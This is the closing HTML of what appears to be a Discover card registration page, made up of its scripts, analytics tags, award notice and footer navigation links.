<script language="javascript" src="https://www.discovercard.com/scripts/optimized/vendor-ac-global-bottom.js"></script> 

<script type="text/javascript">
	mcd.dom.ready(function(){
		mcd.util.externalLinkHandler();
		
		var bar = document.getElementById("progress-step");
		mcd.dom.addClass(bar,'js-on');
		var step3 = document.getElementById("step3");
		mcd.dom.addClass(step3,'js');
	})
</script>
<script type="text/javascript" src="https://www.discovercard.com/registration/scripts/monitorFields.js"></script>
<script type="text/javascript" src="https://www.discovercard.com/registration/scripts/step-one.js"></script>
	
<!--Begin PCC Include file: /common/omnituretracking.shtml-->

<!--End PCC Include file: /common/omnituretracking.shtml-->
<div id="footer">
	
<!-- BEGIN: Social media links -->
<span class="sr" id="foo">Footer Region</span>
  <div class="global-social-footer" aria-describedby="foo">
    <div class="global-sf-container">
      <div class="global-sf-inner">
	  <div id="jd-power-award-footer" style="background: url('https://www.discovercard.com/loginlogout/images/JDPower_small.png') no-repeat left 12px; float: left; display: inline-block; width: 416px; margin-left: 20px;">
			<p style="margin-left: 60px; font-size: 13px; padding: 24px 0; color: #293033; line-height: 1.4;">"Highest in Customer Satisfaction with Credit Card Companies. Tied in 2014" by J.D. Power. <a class="view-disclosure" style="background: url('https://www.discovercard.com/images/utility-icons.png') no-repeat scroll -21px -111px transparent; display: inline; font-weight: normal; padding: 0 0 0 19px;" href="javascript:void(0);" title="Learn More">Learn More</a></p>
		</div>
		<div id="jdpower-disclosure-overlay" class="hide" style="left: 27%; z-index:25; margin-top: -150px; width: 525px; padding: 25px; position: absolute; background: url('https://www.discovercard.com/loginlogout/images/bg_banner-gradient.jpg') repeat-x scroll 0 220px #FFFFFF; border: solid 1px #c0c8cc;">
			<a href="javascript:void(0);" class="close-disclosure" style="position: absolute; background: none; right: 10px; top: 10px; line-height: 12px; color: #267bb1; cursor: pointer; z-index: 10; min-height: 12px; padding: 0;">
				<span class="icon-close" style="display: inline-block; width: 50px; height: 12px; background: url('https://www.discovercard.com/loginlogout/images/bg_close-btn.gif') no-repeat right top;">Close</span>
			</a>
			<p class="overlay-content" style="color: #293033; line-height: 1.3; font-size: 13px;">Discover received the highest numerical score among credit card issuers in a tie in the proprietary J.D Power 2014 Credit Card Satisfaction Study<sup>SM</sup>. Study based on responses from 19,913 consumers measuring 11 card issuers and measures opinions of consumers about the issuer of their primary credit card. Proprietary study results are based on experiences and perceptions of consumers surveyed in September 2013 - May 2014. Your experiences may vary. Visit jdpower.com</p>
			<div class="clearfix"></div>
		</div>

        <ul>
       <li class="global-social-footer-twitter"><a  href="https://www.discovercard.com/scripts/PageExit.htm?log=1&amp;ICMPGN=SC_FTR_PUB_FB&amp;v_eurl=http://www.twitter.com/discover" title="Follow Us on Twitter" aria-describedby="read_lu" style="position: relative; right: 18px;"></a><span class="sr" id="read_fu" role="presentation">Opens up a new window</span></li>
	   <li class="global-social-footer-facebook"><a  href="https://www.discovercard.com/scripts/PageExit.htm?log=1&amp;ICMPGN=SC_FTR_PUB_FB&amp;v_eurl=http://www.facebook.com/discover" title="Like Us on Facebook" aria-describedby="read_lu" style="position: relative; left:4px;"></a><span class="sr" id="read_lu" role="presentation">Opens up a new window</span></li>
       <li class="global-social-footer-linkedin"><a   href="https://www.discovercard.com/scripts/PageExit.htm?log=1&ICMPGN=SC_FTR_PUB_LIN&v_eurl=http://linkedin.com/company/discover-financial-services" title="Connect with Us on LinkedIn" aria-describedby="read_cwu"></a><span class="sr" id="read_cwu" role="presentation">Opens up a new window</span></li>
       <li class="global-social-footer-google"><a   href="https://www.discovercard.com/scripts/PageExit.htm?log=1&ICMPGN=SC_FTR_PUB_GP&v_eurl=http://plus.google.com/+Discover/posts" title="google+" aria-describedby="read_cwu"></a><span class="sr" id="read_cwu" role="presentation">Opens up a new window</span></li>
       <li class="global-social-footer-mobile"><a   href="https://www.discover.com/credit-cards/member-benefits/mobile?ICMPGN=SC_FTR_PUB_MOB" title="Discover Mobile" aria-describedby="read_dm"></a><span class="sr" id="read_dm" role="presentation">Opens up a new window</span></li>
        </ul>
      </div>
    </div>
  </div>
  <!-- END: Social media links -->
  <!--BEGIN: Global footer-->
  <div id="global-footer-wrap">
    <div id="global-footer-content">
      <div class="primary-links-wrap">
        <div class="link-group">
          <h3 class="ul-header" >Credit Cards</h3>
          <ul>
            <li><a href="https://www.discover.com/credit-cards/index.html?ICMPGN=FTR_CC_CBBCRD">Cash Credit Card</a></li>
            <li><a href="https://www.discover.com/credit-cards/student/index.html?ICMPGN=FTR_CC_STUD">Student Credit Cards</a></li>
            <li><a href="https://www.discovercard.com/scripts/PageExit.htm?log=1&gcmpgn=1103_mor_footer_dscr_accpt&v_eurl=http://www.discovernetwork.com/card-network/acceptance.html">Discover Acceptance</a></li>
			<li><a href="https://servicecenter.discovernetwork.com/iac/exec/merchantLeadForm.do?ICMPGN=FTR_CC_RAM">Refer a Merchant</a></li>
            <li><a href="https://www.discover.com/credit-cards/cardmember-agreement/?gcmpgn=1103_mor_footer_cmagr">Cardmember Agreement</a></li>
          </ul>
        </div>

        <div class="link-group">
         <h3 class="ul-header">Rewards</h3>
          <ul>
            <li><a href="https://www.discover.com/credit-cards/cashback-bonus/cashback-calendar.html?ICMPGN=FTR_CBB_5CBB">5% <em>Cashback Bonus</em></a></li>
			<li><a href="https://www.discover.com/credit-cards/credit-card-rewards.html?ICMPGN=FTR_RWDS_RWDS">Credit Card Rewards</a></li>
            <li><a href="https://www.discover.com/credit-cards/deals/?ICMPGN=FTR_CBB_DISCDEALS">Discover Deals</a></li>
            <li><a href="https://www.discover.com/credit-cards/cashback-bonus/redeem-cashback.html?ICMPGN=FTR_CBB_REDEMP">Redemption Options</a></li>
            <li><a href="https://www.discover.com/credit-cards/exclusives/sharediscover/index.html?ICMPGN=FTR_CBB_RAF_TXT_HPK">$50 <em>Cashback Bonus</em><br> Refer a Friend</a></li>
          </ul>
        </div>

        <div class="link-group">
          <h3 class="ul-header" >Other Products </h3>
          <ul>
            <li><a href="https://www.discover.com/online-banking/?gcmpgn=1103_mor_footer_sapr">Banking</a></li>
            <li><a href="https://www.discover.com/home-loans/?gcmpgn=1105_ACH_OTHER_PROD_DHL_FTR">Home Loans</a></li>
			<li><a href="https://www.realestatereward.com/?ICMPGN=FTR_OTHER_DHL_HS_HP">Home Search</a></li>
            <li><a href="https://www.discover.com/home-equity-loans/?gcmpgn=1103_mor_footer_dhelo">Home Equity Loans</a></li>
            <li><a href="https://www.discover.com/personal-loans/?gcmpgn=1103_mor_footer_pelo">Personal Loans</a></li>
            <li><a href="https://www.discover.com/student-loans/index.html?gcmpgn=1103_mor_footer_stlo">Student Loans</a></li>
            <li><a href="https://www.discover.com/gift-cards/?gcmpgn=1103_mor_footer_gica">Gift Cards</a></li>
            <li><a href="https://www.discover.com/credit-cards/member-benefits/balance-transfer.html?ICMPGN=FTR_OTHER_BT">Balance Transfer</a></li>
          </ul>
        </div>

        <div class="link-group">
         <h3 class="ul-header">Help &amp; Support</h3>
          <ul>
            <li><a href="https://www.discover.com/credit-cards/help-center/index.html?ICMPGN=FTR_HELP_CS">Help Center</a></li>
            <li><a href="https://www.discover.com/credit-cards/member-benefits/security-center/?gcmpgn=1103_mor_footer_secprot">Security Center</a></li>
            <li><a href="https://www.discovercard.com/cardmembersvcs/helpcenter/action/mainPage?gcmpgn=1103_mor_footer_faq">Frequently Asked Questions</a></li>
            <li><a href="https://www.discover.com/credit-cards/help-center/account/international-use.html?scmpgn=va_intltravel" title="Global Acceptance">Global Acceptance</a></li>
			<li><a href="https://www.discover.com/credit-cards/help-center/account/international-use.html?scmpgn=va_intltravel" title="Register or Update Travel">Register or Update Travel</a></li>
            <li><a href="https://www.discovercard.com/cardmembersvcs/cardinventory/action/loadLostStolen?ICMPGN=FTR_LOST_STL_REPORT_TXT">Report Lost or Stolen Card</a></li>
            <li><a  href="https://www.discover.com/cash-atm-locator/?ICMPGN=FTR_HELP_ATM">ATM Locator</a></li>
            <li><a  href="https://www.discover.com/credit-cards/resources/?gcmpgn=1103_mor_footer_credres">Credit Resource Center</a></li>
          </ul>
        </div>

        <div class="link-group last" role="presentation">
         <h3 class="ul-header">about us</h3>
          <ul>
            <li><a href="https://www.discover.com/company/?gcmpgn=1103_mor_footer_abdi">About Discover</a></li>
            <li><a href="https://www.discover.com/company/corporate-responsibility/financial-education/?gcmpgn=1103_mor_footer_fied">Financial Education</a></li>
            <li><a href="https://www.discovercard.com/scripts/PageExit.htm?log=1&gcmpgn=1103_mor_footer_inre&v_eurl=http://investorrelations.discoverfinancial.com/phoenix.zhtml?c%3D204177%26p%3Dirol-IRHome">Investor Relations</a></li>
            <li><a href="https://www.discover.com/company/newsroom/?gcmpgn=1103_mor_footer_nero">Newsroom</a></li>
            <li><a href="https://www.discovercard.com/scripts/PageExit.htm?log=1&gcmpgn=1103_mor_footer_care&v_eurl=http://www.mydiscovercareer.com">Careers</a></li>
          </ul>
        </div>
      </div>

      <div class="secondary-links-wrap" role="contentinfo">
        <ul role="presentation" class="newStylePre" >
          <li role="presentation"><a href="https://www.discovercard.com/cardmembersvcs/common/sitemap?gcmpgn=1103_mor_footer_sima">Site Map</a></li>
          <li class="last" role="presentation"><a href="https://www.discovercard.com/cardmembersvcs/helpcenter/action/mainPage?gcmpgn=1103_mor_footer_contact">Contact Us</a></li>
        </ul>
	  
        <ul role="presentation"  >
		 
          <li role="presentation"><a href="https://www.discover.com/credit-cards/help-center/terms-of-use.html?gcmpgn=1103_mor_footer_tou">Terms of Use</a></li>
          <li role="presentation"><a href="https://www.discover.com/privacy-statement/index.html?gcmpgn=1103_mor_footer_prst">Privacy</a></li>
          <li class="last"  role="presentation"><a  href="https://www.discover.com/credit-cards/member-benefits/security-center/?gcmpgn=1103_mor_footer_secu">Security Center</a></li>
		  
        </ul>
        <a class="equal-housing-lender" href="https://www.discover.com/home-loans/statelicenses/">Equal Housing Lender</a>
        <a class="member-fdic" href="http://www.fdic.gov/"  aria-describedby="read_fdic">Member FDIC</a>
		<a class="symantec_image" href="JavaScript:newPopup('https://trustsealinfo.verisign.com/splash?form_file=fdf/splash.fdf&amp;dn=www.discovercard.com&amp;lang=en');"></a>
	<span class="sr" id="read_fdic" role="presentation">Opens up a new window</span>
        <a class="it-pays-to-discover" href="https://www.discover.com/credit-cards/cashback-bonus/">It pays to DISCOVER</a>
      </div>
    </div>
  </div>
  <div class="primary-links-bottom"></div>
  <!--END: Global footer-->
	
</div>
<!--omniture SiteCatalyst tag START -->
<script language='JavaScript' type='text/javascript'> 
s_account="discoverglobalprod,discovercardservicingprod";
</script>
<script language="JavaScript" type="text/javascript" src="https://www.discovercard.com/discover/reporting/s_code.js"></script> 
<script type="text/javascript" src="https://www.discovercard.com/scripts/sSearch.js"></script> 
<script language="JavaScript" type="text/javascript"> 
var s_code=s.t();
if(s_code)document.write(s_code); 
</script>
<!--omniture SiteCatalyst tag END-->
<script language="javascript" type="text/javascript" src="https://www.discovercard.com/scripts/optimized/AccessibilityMenu.js"></script>

<script type="text/javascript">
function getCookieValue(cookieName) {
	if (document.cookie.length > 0) {
		dcuser_start = document.cookie.indexOf(cookieName + "=");
		if (dcuser_start != -1) {
			dcuser_start = dcuser_start + cookieName.length + 1;
			dcuser_end = document.cookie.indexOf(";", dcuser_start);
			if (dcuser_end == -1) c_endV3 = document.cookie.length;
			return unescape(document.cookie.substring(dcuser_start, dcuser_end));
		}
	}
	return "";
};
var dfsedskey = getCookieValue('dfsedskey');
if (typeof(dfsedskey) != 'undefined' || dfsedskey != '') {
	var lpMTagConfig = lpMTagConfig || {}; 
	lpMTagConfig.vars = lpMTagConfig.vars || [];
	lpMTagConfig.vars.push(["session", "lpCustomerID", dfsedskey]);
}
</script>
<script>window.jQuery || document.write('<script src="https://www.discovercard.com/scripts/libs/jquery-1.7.2.min.js"><\/script>')</script>
<script type="text/javascript"> 
	$("#jd-power-award-footer .view-disclosure").click(function() {
	  $('#jdpower-disclosure-overlay').removeClass('hide');
	});
	$("#jdpower-disclosure-overlay .close-disclosure").click(function() {
	  $('#jdpower-disclosure-overlay').addClass('hide');
	});
</script>
<script type="text/javascript">
// Popup window code for symantec_image
function newPopup(url) {
	popupWindow = window.open(
		url,'popUpWindow','height=500,width=550,left=10,top=50,resizable=yes,scrollbars=no,toolbar=no,menubar=no,location=no,directories=no,status=no')
}
</script>

</body>